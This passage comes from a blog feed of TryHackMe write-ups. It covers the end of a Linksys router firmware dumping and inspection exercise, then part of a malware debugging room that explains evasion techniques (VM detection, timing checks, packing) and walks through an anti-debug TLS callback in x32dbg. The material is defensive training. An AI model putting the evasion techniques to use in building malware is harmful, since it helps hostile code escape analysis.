</code></pre></div></div> <p>Step 4. Write image to /dev/mtdblock0</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>/opt/Dumping-Router-Firmware-Image/_FW_WRT1900ACSV2_2.0.3.201002_prod.img.extracted/600000.jffs2 <span class="nv">of</span><span class="o">=</span>/dev/mtdblock0
</code></pre></div></div> <p>Step 5. Mount file system to folder location</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> jffs2 /dev/mtdblock0 /mnt/jffs2_file/
</code></pre></div></div> <p>Step 6. Lastly, move into the mounted filesystem.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /mnt/jffs2_file/
</code></pre></div></div> <p>To explain a little bit of what the command does, we’re creating a block device (mtdblock (<a href="https://en.wikipedia.org/wiki/Memory_Technology_Device">Memory Technology Device</a>)) that will allow us to dump the flash memory. We’re first removing it if it exists, and then re-creating it.</p> <p>Next, we’re creating a location for our <a href="https://en.wikipedia.org/wiki/JFFS2">jffs2</a> file to be mounted to.</p> <p>After that, we’re loading some kernel modules that will allow us to interact with the jffs2 file system and dump the flash memory.</p> <p>Next, we write the file system to the block device, and after that we mount the mtdblock device which now contains the flash memory of the file system.</p> <p>Lastly, executing <code class="language-plaintext highlighter-rouge">cd /mnt/jffs2_file/</code> we are now sitting inside the router’s dumped firmware and can begin the investigation.</p> <h3 id="questions">Questions</h3> <p>Running an ls -la reveals a lot of interesting information. First, we notice that many files are symbolically linked (similar to a shortcut).</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-205-228:/mnt/jffs2_file# <span class="nb">ls</span> <span class="nt">-lha</span>
total 6.5K
drwxr-xr-x 17 root root    0 Jan  1  1970 <span class="nb">.</span>
drwxr-xr-x  3 root root 4.0K Oct 10 13:45 ..
drwxr-xr-x  2 root root    0 Apr 22  2020 bin
drwxr-xr-x  2 root root    0 Apr 22  2020 cgroup
drwxr-xr-x  2 root root    0 Apr 22  2020 dev
drwxr-xr-x 17 root root    0 Apr 22  2020 etc
drwxr-xr-x  2 root root    0 Apr 22  2020 home
drwxr-xr-x  3 root root    0 Apr 22  2020 JNAP
drwxr-xr-x  2 root root    0 Apr 22  2020 lib
lrwxrwxrwx  1 root root   11 Apr 22  2020 linuxrc -&gt; bin/busybox
lrwxrwxrwx  1 root root    8 Apr 22  2020 mnt -&gt; /tmp/mnt
<span class="nt">-r--r--r--</span>  1 root root   20 Apr 22  2020 .mtoolsrc
lrwxrwxrwx  1 root root    8 Apr 22  2020 opt -&gt; /tmp/opt
drwxr-xr-x  2 root root    0 Apr 22  2020 proc
drwxr-xr-x  2 root root    0 Apr 22  2020 root
drwxr-xr-x  2 root root    0 Apr 22  2020 sbin
drwxr-xr-x  2 root root    0 Apr 22  2020 sys
drwxr-xr-x  2 root root    0 Apr 22  2020 tmp
drwxr-xr-x  2 root root    0 Apr 22  2020 usr
lrwxrwxrwx  1 root root    8 Apr 22  2020 var -&gt; /tmp/var
drwxr-xr-x  2 root root    0 Apr 22  2020 www
</code></pre></div></div> <p><strong>Where does linuxrc link to?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/bin/busybox</code></em></p> <p><strong>What parent folder do mnt, opt, and var link to?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/tmp/</code></em></p> <p><strong>What folder would store the router’s HTTP server?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/www/</code></em></p> <p>Scanning through a lot of these folders, you may begin to notice that they are empty. This is extremely strange, but that is because the router is not up and running. Remember, we are merely looking at a template of the filesystem that will be flashed onto the router, not the firmware from a router that has been dumped. Other information about the router may be contained in the previous section within the 6870 block.</p> <p>The first of the folders that aren’t empty is /bin/; where do a majority of the files link to?</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip-10-10-205-228# <span class="nb">ls</span> <span class="nt">-la</span> bin/ | <span class="nb">head
</span>total 1357
drwxr-xr-x  2 root root      0 Apr 22  2020 <span class="nb">.</span>
drwxr-xr-x 17 root root      0 Jan  1  1970 ..
lrwxrwxrwx  1 root root      7 Apr 22  2020 addgroup -&gt; busybox
lrwxrwxrwx  1 root root      7 Apr 22  2020 adduser -&gt; busybox
lrwxrwxrwx  1 root root      7 Apr 22  2020 ash -&gt; busybox
<span class="nt">-rwxr-xr-x</span>  1 root root   7112 Apr 22  2020 attr
<span class="nt">-rwxr-xr-x</span>  1 root root 593280 Apr 22  2020 busybox
lrwxrwxrwx  1 root root      7 Apr 22  2020 <span class="nb">cat</span> -&gt; busybox
lrwxrwxrwx  1 root root      7 Apr 22  2020 catv -&gt; busybox
</code></pre></div></div> <p>Why is that? Well, <a href="https://ubuntuforums.org/archive/index.php/t-846852.html">busybox is more or less a tool suite of common executable commands within the Unix environment.</a></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">busybox</code></em></p> <p>Interestingly, what database would be running within the bin folder if the router was online?</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip-10-10-205-228# <span class="nb">ls</span> <span class="nt">-la</span> bin/ | <span class="nb">grep </span>sql   
<span class="nt">-rwxr-xr-x</span>  1 root root  33764 Apr 22  2020 sqlite3
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">sqlite3</code></em> The following notable folder of interest is /etc/. This folder contains many configuration files for the router, such as Access Point power levels regulated by certain countries. One you might recognize is the FCC (Federal Communications Commission).</p> <p><strong>We can even see the build date of the device. What is the build date?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip-10-10-205-228# <span class="nb">cat </span>etc/builddate
2020-04-22 11:44# 
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2020-04-22 11:44</code></em></p> <p><strong>There are even files related to the SSH server on the device. What SSH server does the machine run?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lh</span>
<span class="nt">-r--r--r--</span>  1 root root  458 Apr 22  2020 dropbear_dss_host_key
<span class="nt">-r--r--r--</span>  1 root root  427 Apr 22  2020 dropbear_rsa_host_key
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">dropbear</code></em></p> <p><strong>We can even see the file for the media server, which company developed it?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-205-228:/mnt/jffs2_file# <span class="nb">head </span>etc/mediaserver.ini 
<span class="c">#! Cisco MediaServer ini file ( twonky revision ) / charset UTF-8</span>
<span class="c">#! change settings by editing this file</span>
<span class="c">#! version 5.1.05</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">cisco</code></em></p> <p>This company use to own Linksys at one point in time, which is likely why it is still being used.</p> <p>Which file within /etc/ contains a list of standard Network services and their associated port numbers?</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-205-228:/mnt/jffs2_file# <span class="nb">head </span>etc/services <span class="nt">-n</span> 20
<span class="c"># Network services, Internet style</span>
<span class="c">#</span>
<span class="c"># Note that it is presently the policy of IANA to assign a single well-known</span>
<span class="c"># port number for both TCP and UDP; hence, officially ports have two entries</span>
<span class="c"># even if the protocol doesn't support UDP operations.</span>
...

tcpmux  1/tcp    <span class="c"># TCP port service multiplexer</span>
<span class="nb">echo  </span>7/tcp
<span class="nb">echo  </span>7/udp
discard  9/tcp  sink null
discard  9/udp  sink null
systat  11/tcp  <span class="nb">users
</span>daytime  13/tcp
daytime  13/udp
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">services</code></em></p> <p><strong>Which file contains the default system settings?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-239-139:/mnt/jffs2_file/etc# <span class="nb">head </span>system_defaults
<span class="c">################################################################################</span>
<span class="c"># This file contains system defaults which will be used</span>
<span class="c"># if, and only if, the value has not yet been set</span>
<span class="c"># Both sysevent and syscfg namespace can be set</span>
...
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">system_defaults</code></em></p> <p><strong>What is the specific firmware version within the <code class="language-plaintext highlighter-rouge">/etc/</code> folder?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-239-139:/mnt/jffs2_file/etc# <span class="nb">cat </span>version
2.0.3.201002
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2.0.3.201002</code></em></p> <p>Backing out into the JNAP folder, the JNAP API (formerly known as HNAP, the Home Network Administration Protocol) has been a potential attack vector and vulnerability in the past, which this article highlights <a href="https://routersecurity.org/hnap.php">here</a>. Interestingly enough, reminisce of it is still here today on Linksys devices. Going to <code class="language-plaintext highlighter-rouge">http://&lt;Default_Gateway&gt;/JNAP/</code> on a Linksys router reveals an interesting 404. Much different than the standard 404.</p> <p><strong>Accessing /JNAP/</strong></p> <figure> <picture> <img src="/assets/img/images/thm_dumping_router_firmware/ry9Q0vrJJg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Accessing JNAP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><strong>Accessing any other invalid URI</strong></p> <figure> <picture> <img src="/assets/img/images/thm_dumping_router_firmware/Hy1rRwSJ1l.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Accessing any other invalid URI" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This makes you wonder if something is still really there. If you investigate within /JNAP/modules folder back on the dumped filesystem, you will see some contents related to the device and what services it offers, some of them are firewalls, http proxies, QoS, VPN servers, uPnP, SMB, MAC filtering, FTP, etc.</p> <blockquote> <p>Side note: If you have a Linksys router and are interested in playing around further, I found this <a href="https://github.com/jakekara/jnap">Github Repository</a> for tools to interact with JNAP, I chose not to include this within the room since not everyone has access to a Linksys router. I won’t go much further than exploring the File System.</p> </blockquote> <p><strong>What three networks have a folder within /JNAP/modules?</strong></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-239-139:/mnt/jffs2_file/JNAP/modules# <span class="nb">ls</span> <span class="nt">-d</span> <span class="k">*</span>/
guest_lan/  lan/  wan/
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">guest_lan, lan, wan</code></em></p> <p>After the JNAP folder, <code class="language-plaintext highlighter-rouge">lib</code> is the only other folder with any contents whatsoever, and what’s in there is standard in terms of libraries. The rest of the file system is relatively bare, leading us to this room’s end.</p> <p>I hope I made you all more curious about what’s happening in your device; most importantly, I hope you enjoyed it. I encourage all of you to go out on your own and get your own router’s Firmware, do some firmware dumping, and look at what’s happening inside your device.</p> <p>A room about Cable Modems may come in the future. However, Cable Modems firmware images are relatively difficult to access since they are only distributed to CMOs (Cable Modem Operators, like Charter, Xfinity, Cox, etc.)</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="Forensics"/><summary type="html"><![CDATA[Note: Unlike many of my other writeups, this one doesn’t include a summary, and the phrases are identical to those in Dumping Router Firmware. I completed this room to gain a basic overview of firmware analysis.]]></summary></entry><entry><title type="html">THM Dynamic Analysis: Debugging</title><link href="https://nonohm.github.io/blog/2024/THM-Dynamic-Analysis-Debugging/" rel="alternate" type="text/html" title="THM Dynamic Analysis: Debugging"/><published>2024-08-19T08:31:15+00:00</published><updated>2024-08-19T08:31:15+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Dynamic-Analysis-Debugging</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Dynamic-Analysis-Debugging/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In Basic Dynamic Analysis room, we have learnt how to identify malware traces in an infected system during execution. However, malware authors understand that malwares are analyzed and want to thwart this by doing some more advanced evasion techniques.<br/> In order to defeat some of them, we will learn how a malware analyst can control malware execution to achieve the desired results.</p> <h3 id="learning-ojectives">Learning Ojectives</h3> <ul> <li>Evasion techniques used to evade basic dynamic analysis</li> <li>Introduction to debuggers and how they can help us control the execution flow of malware</li> <li>Manipulating execution flow at runtime by changing registers or other parameters</li> <li>Patching malware to force it to move past the evasion techniques onto the actual malicious content</li> </ul> <h3 id="pre-requisites">Pre-requisites</h3> <p>It is recommended to have followed these rooms to get a better understanding from this one:</p> <ul> <li><a href="https://tryhackme.com/room/staticanalysis1">Basic Static Analysis</a></li> <li><a href="https://tryhackme.com/room/advancedstaticanalysis">Advanced Static Analysis</a></li> <li><a href="http://tryhackme.com/room/basicdynamicanalysis">Basic Dynamic Analysis</a></li> </ul> <h2 id="task-2---the-need-for-advanced-dynamic-analysis">Task 2 - The Need for Advanced Dynamic Analysis</h2> <p>Analyzing malware is like a cat-and-mouse game. While malware analysts keep devising new techniques to analyze malware, malware authors conceives new techniques to evade detection.</p> <h3 id="evasion-of-static-analysis">Evasion of Static Analysis</h3> <p>In static analysis, because we are not executing the malware, its main focus for evading is to obfuscate the true functionality of the program until it is executed. The following techniques are the common ones used to achieve this:</p> <ul> <li><strong>Changing the hash</strong>: Since every file has a unique hash, sligthly changing the malware bypasses a hash-based detection mechanism (unless we are talking about fuzzy hashes). This is usually done by adding a <code class="language-plaintext highlighter-rouge">NOP</code> instruction.</li> <li><strong>Defeating AV signatures</strong>: Signature-based detection often depend on static patterns found inside the malware. Signature detection is evaded by changing those and adding some obfuscation.</li> <li><strong>Obfuscation of strings</strong>: Strings can be obfuscated in the code and decoded at runtime. This makes string search unsuccessful. Malware authors might obfuscate important strings such as URLs, C2 domains, etc…</li> <li><strong>Runtime loading of DLLs</strong>: When analyzing a malware statically, we might not see all the functions it is linked to because they are loaded at runtime using <code class="language-plaintext highlighter-rouge">LoadLibrary</code>. However, we can try to identify what imports are being made.</li> <li><strong>Packing and Obfuscation</strong>: Packing is a very popular way to obfuscate a binary owing the fact that a packer packs the malware in a wrapper by encoding the actual code and writing code that decodes it at execution.</li> </ul> <h3 id="evasion-of-basic-dynamic-analysis">Evasion of Basic Dynamic Analysis</h3> <p>Since malware won’t let themselves being detected, a host of techniques are employed, of which the most common ones are identifying if the malware runs in a controlled analysis environment. The following techniques are used for this purpose:</p> <ul> <li><strong>Identification of VMs</strong>: Though some of these techniques might backfire nowadays since a lot of company infrastructures are hosted on VM, one of the favourites is to identify if the malware is running inside a VM. For this, registry keys or drivers associated with popular virtualization software like VirtualBox/VMWare are checked. Similarly, minimal ressources such as a single CPU and limited RAM might indicate that the malware is running inside a VM. In this case, malware will take a legitimate execution path to fool the analyst.</li> <li><strong>Timing attacks</strong>: To time out automated analysis systems, the <em>Windows Sleep Library</em> is mainly used. These type of systems usually shut down after a few minutes, finding no traces of malicious activity. Newer analysis systems can identify these attacks and try to mitigate them by shortening the time the malware sleeps. However, those mitigations can be identified by the malware by noting the time of execution and comparing with the current time after the execution of the sleep call.</li> <li><strong>Traces of user activity</strong>: Malware tries to identify traces of user activity (mouse, keyboard, browser history, recently opened files, little system uptime…), then if no or few traces are found, it will change its execution scheme.</li> <li><strong>Identification of analysis tools</strong>: Running processes can be listed on Windows systems using <code class="language-plaintext highlighter-rouge">Process32First</code>, <code class="language-plaintext highlighter-rouge">Process32Next</code>, etc… If popular monitoring tools are identified among the list like <em>ProcMon</em> or <em>ProcExp</em>, the malware can switch its activites. Another ways of identifying are by looking at the names of different windows, searching for some services or checking applications behaviour.</li> </ul> <h3 id="questions">Questions</h3> <p><strong>Malware sometimes checks the time before and afte r the execution of certain instructions to find out if it is being analysed. What type of analysis technique is bypassed by this attack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Basic Dynamic Analysis</code></em></p> <p><strong>What is a popular technique used by malware authors to obfuscate malware code from static analysis and unwrap it at runtime?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Packing</code></em></p> <h2 id="task-3---introduction-to-debugging">Task 3 - Introduction to Debugging</h2> <p>The term <em>Debugging</em> is widely used by software programmer to identify and fix bugs in a program. Similarly, a malware trying to evade detection or reverse engineering can also be considered as a program having a bug.<br/> Because a malware analyst often has to debug a program to remove any roadblocks that prevent it from performing its malicious activity, interactive debugging becomes an essential part of Advanced Malware Analysis. Debugger provides the control to running a program more closely by looking at the changes in different registers, variables and memory regions step by step as each instruction is executed one at a time. It also provides the ability to change the variables’ values and other parameters to control the program’s flow at runtime.</p> <h3 id="source-level-debuggers">Source-Level Debuggers</h3> <p>Source Level Debuggers work on the source code of a program and are often used by software developpers to check bugs in their code. It is a high-level option compared to the two other ones.</p> <h3 id="assembly-level-debuggers">Assembly-Level Debuggers</h3> <p>When a program has been compiled, its source code is lost and can’t be recovered. Usually, we don’t have the malware’s source code we are investigating and have a compiled binary instead. An assembly-level debugger can help us debug compiled programs by seeing the CPU regsiters’ values and the debugger’s memory. This is the most common type of debugger used for malware RE.</p> <h3 id="kernel-level-debuggers">Kernel-Level Debuggers</h3> <p>This type of debugger is a step even lower than assembly-level ones. As the name suggests, it permits the debug of a program at the Kernel Level which involves two systems, one used for debugging and another one where the code is running. This is because if the kernel is stopped using a breakpoint, the whole system will stop.</p> <h3 id="questions-1">Questions</h3> <p><strong>Can we recover the pre-compilation code of a compiled binary for debugging purposes? Write Y for Yes or N for No</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">N</code></em></p> <p><strong>Which type of debugger is used for debugging compiled binaries?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Assembly-level debugger</code></em></p> <p><strong>Which debugger works at the lowest level among the discussed debuggers?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Kernel-level debugger</code></em></p> <h2 id="task-4---familiarization-with-a-debugger">Task 4 - Familiarization with a Debugger</h2> <p>For malware analysis, there are many options to choose a debugger from, such as <em>Windbg</em>, <em>Ollydbg</em>, <em>IDA</em>, <em>Ghidra</em> and <em>x32/x64dbg</em>. Here, we will be using the last one.</p> <p>When we open <em>x32dbg</em> (x32dbg for 32-bit applications, x64dbg for 64-bit applications) in FLARE VM <code class="language-plaintext highlighter-rouge">Desktop &gt; Tools &gt; debuggers &gt; x32dbg.exe</code>, we are greeted with this interface:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/SJCr_ZXjC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg interface" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>To open a file in the debugger, we can navigate to <code class="language-plaintext highlighter-rouge">File &gt; Open</code>. The below creenshot show the interface with a sample opened in the debugger.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/rySJFfmoR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg Main interface with sample" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we can see in the bottom-left corner, the execution of the program is paused because a <em>System breakpoint</em> has been reached. We can control whether to execute one instruction at a time or the whole program.<br/> In the screenshot above, we can see different parts in the main window, where each one have a specific role:</p> <ol> <li><strong>CPU disassembly</strong>: This is where the assembly instructions are located. <ul> <li>In the first colum contains the EIP (Extended Instruction Pointer) pointing to the next instruction which will be run.</li> <li>The second column contains addresses within the binary where instructions reside, here EIP is pointing to <code class="language-plaintext highlighter-rouge">77A6F147</code>.</li> <li>The third colum is the hexadecimal representation of the instruction in column 4.</li> <li>The fourth column is where the assembly instructions are located, here the next instruction to be executed is <code class="language-plaintext highlighter-rouge">jmp ntdll.Memoryaddress</code>.</li> <li>The fifth column is contains data populated by x64dbg or notes that have been added by the analyst. Most of the time, binary’s strings will be shown here.</li> </ul> </li> <li><strong>CPU Registers</strong>: This window contains information related to registers and flags. More information available in <a href="https://tryhackme.com/r/room/x8664arch">x86 Architecture Overview</a> <ul> <li>EAX: Used for addition, multiplication and return values</li> <li>EBX: Generic register, used for various operations</li> <li>ECX: Used as a counter</li> <li>EDX: Generic register, used for various operations</li> <li>EBP: Used to reference arguments and local variables</li> <li>ESP: Points to the last argument on the stack</li> <li>ESI/EDI: Used in memory transfer instructions</li> <li>EIP: Points to the current instruction in x32dbg that will be executed</li> <li>FLAGS</li> </ul> </li> <li><strong>Stack Memory</strong>: This window contains the parameters that have been pushed onto the stack.</li> <li><strong>Stack and data</strong>: This window contains the stack, the data that has been pushed onto the stack and the addresses in memory they are mapped to.</li> <li><strong>Dump Data</strong>: This window allows the user to see what is being stored in a register or what data resides at a certain address.</li> </ol> <p>Let’s look at some of the other tabs. The <em>breakpoints</em> tab shows the current status of breakpoints. Breakpoints are where the execution of the program is paused for the analyst to analyze the registers and memory. It can be enabled by clicking the dot located in front of each instruction in <em>CPU</em> tab.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/rkeRqz7jA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg Breakpoints tab" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The <em>Memory Map</em> tab show the memory of the program:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/HJJ-oGQiA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Memory Map tab" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We can also see the <em>Call Stack</em> of the program:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/HyDVoGmjC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Call Stack tab" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Running threads of the current program are show in the <em>Threads</em> tab:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/HJB6ozXo0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Threads tab" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Any handles to files, process or other ressources the process accesses are shown in the <em>Handles</em> tab:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/Hk9x3M7s0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Handles tab" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-2">Questions</h3> <p><strong>In which tab is the disassembly view shown in x32dbg?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CPU Tab</code></em></p> <p><strong>If a process opens a file or a process, where can we see information regarding that opened file or process?</strong></p> <p>*Answer: <code class="language-plaintext highlighter-rouge">Handles Tab</code></p> <h2 id="task-5---debugging-in-practice">Task 5 - Debugging in Practice</h2> <p>Now we are bit more familiar with the UI of x32dbg, let’s learn about debugging a program in practice by executing it step-by-step.</p> <p>Firstly, we select the file we need to open using <code class="language-plaintext highlighter-rouge">File &gt; Open</code> or with <code class="language-plaintext highlighter-rouge">F3</code>. The debugger attaches itself to the process and pauses it before it starts, that is why we see a blank command window in the background. Furthermore, the window might not open with all processes depending on the UI (User Interface) of the process.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/r1Oe6IEiR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg crackme-arebel" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In the debugger window, we have some features that help us control the execution, presented in the screenshot below:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/rkSxCI4j0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg debugging function" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Among these buttons, from left to right we have the feature for:</p> <ul> <li>Opening a new file</li> <li>Restarting the execution of the app from the start</li> <li>Stopping the execution</li> <li>Execute the program until it is stopped or paused by some control/breakpoint</li> <li>Pause the execution</li> <li>Step into a function call</li> <li>Step over a function call</li> </ul> <p>To start with debugging, we use the <em>arrow</em> button to go the first breakpoint, which is normally the entry point of the program. Along with the status, we see the reason <em>INT3 breakpoint “TLS Callback 1”</em>, which means we have hit a <a href="https://hex-rays.com/blog/tls-callbacks/">TLS Callback</a> and the debugger is configured to automatically break on them.<br/> To resume, a <em>Thread Local Storage</em> or <em>TLS</em> for short, is a mechanism which allows a thread to have its own storage for data with its own instance of variables in order to not make interference in multithread application. TLS Callbacks are special functions in Windows used to initialize or clean process or thread data.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/SJbrVliiA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg TLS Callback" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In the debugger, we can set where to put automatic breakpoints in <code class="language-plaintext highlighter-rouge">Options &gt; Preferences</code> menu. Here, we can see that TLS Callbacks breakpoints are checked.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/B10e8gss0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg options" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Since TLS Callbacks are often used as an anti-reverse engineering technique because they are running before the entry point of the program. Therefore, we should be careful when navigating with TLS Callbacks and single-step each instruction while we are in the callback. After stepping into every instruction, we see the EIP increasing, values in registers and stack change accordingly. Then, we reach a conditional jump instruction <code class="language-plaintext highlighter-rouge">jne</code> for <em>jump not equal</em> which jumps if the <em>zero flag</em> ZF is set to 0. In the pane below, the debugger tells us that the jump is not taken.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/SJl4ybsoR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg conditionnal jump" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>If we analyze both paths, it goes to address <em>D116E</em> if the jump is taken which pops <code class="language-plaintext highlighter-rouge">ebp</code> and returns. On the other hand, the current execution path takes us to the address <em>D1000</em>. To know what instruction and execution flow is comming at this address, we can hover it get a glimpse or double clicking to access it.<br/> The below screenshot show the code following at this address and we see a few API calls like <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>, <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibrary</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">GetProcAddress</a> further down. If we were sure what this function call was intended for, we could just step over it to bring us back after the execution has been executed.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/r1CMir3i0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg D1000 execution path" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>However, the function seem very important and we don’t know if it is used for legitimate purposes or to evade detection. Hence, we must move along this path and restart if we see a red flag. Moving forward, another library loaded is <code class="language-plaintext highlighter-rouge">SuspendThread</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/S1tzorhoR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x32dbg API calls" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This TLS callback will suspend the thread based on detecting a running process such as a debugger (<code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot</code> API helps identiéfying processes). This is why the program freeze if we proceed with the execution, thus this will be the goal in the next task to jump over the call.</p> <h3 id="questions-3">Questions</h3> <p><strong>The attached VM has a crackme in the directory <code class="language-plaintext highlighter-rouge">Desktop &gt; crackme-arebel</code>. In that crackme, there is a TLS callback with a conditional jump. Is this conditional jump taken? Write Y for Yes or N for No</strong></p> <p>Because ZF = 1, the <code class="language-plaintext highlighter-rouge">jne</code> conditional jump is not taken.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/SJeR29TjA.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="jne" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">N</code></em></p> <p><strong>What is the value of the Zero Flag in the above-mentioned conditional jump?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Which API call in the mentioned sample is used for enumerating running processes?</strong></p> <p>The API call used for enumerating process is at address <code class="language-plaintext highlighter-rouge">000D1014</code> .</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot</code></em></p> <p><strong>From which Windows DLL is the API SuspendThread being called?</strong></p> <p>The API <code class="language-plaintext highlighter-rouge">SuspendThread</code> documentation is available <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">here</a>. Also, we see that <code class="language-plaintext highlighter-rouge">kernel32.dll</code> is being loaded from <code class="language-plaintext highlighter-rouge">000D1033</code> to <code class="language-plaintext highlighter-rouge">000D106B</code> using <code class="language-plaintext highlighter-rouge">LoadLibrary</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/r12_gsaiA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="kernel32.dll loading" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">kernel32.dll</code></em></p> <h2 